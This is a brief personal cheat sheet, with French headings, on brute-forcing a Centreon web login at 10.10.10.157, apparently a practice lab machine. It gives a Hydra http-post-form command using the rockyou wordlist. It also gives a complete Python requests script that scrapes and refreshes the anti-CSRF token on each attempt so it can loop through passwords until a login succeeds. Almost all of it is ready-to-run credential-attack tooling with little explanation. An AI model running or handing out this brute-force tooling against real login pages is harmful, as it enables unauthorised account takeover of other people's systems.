# http post

# Hydra 

```sh
hydra -l admin -P ../../00ToolBox/Lists_Dictionnaires/rockyou.txt 10.10.10.157 http-post-form "/centreon:centreon_token=ae58b124ee170796a6ea896175376c5b&submitLogin=Connect&useralias=^USER^&password=^PASS^:F=incorrect."
```


# web python3 avec contournement de token anti-CSRF

```python
import requests
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

url = 'http://10.10.10.157/centreon'

users = ['admin']
with open('/home/michael/Documents/Projets/00ToolBox/wordlists/rockyou100.txt') as f:
    passwords = f.read().splitlines()


request = requests.session()
print("[+] Retrieving CSRF token to submit the login form")
page = request.get(url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content)
token = soup.findAll('input')[3].get("value")

for user in users:
    for password in passwords:

        login_info = {
            "useralias": user,
            "password": password,
            "submitLogin": "Connect",
            "centreon_token": token
        }
        login_request = request.post(url+"/index.php", login_info)
        print("[+] Login token is : {0}".format(token))
        if "Your credentials are incorrect." not in login_request.text:
            print("[+] Logged In Sucssfully")
            print("[+] Retrieving Poller token")
            print(user+':'+password)
            exit()
        html_content = login_request.text
        soup = BeautifulSoup(html_content)
        token = soup.findAll('input')[3].get("value")
        print(user+':'+password)


```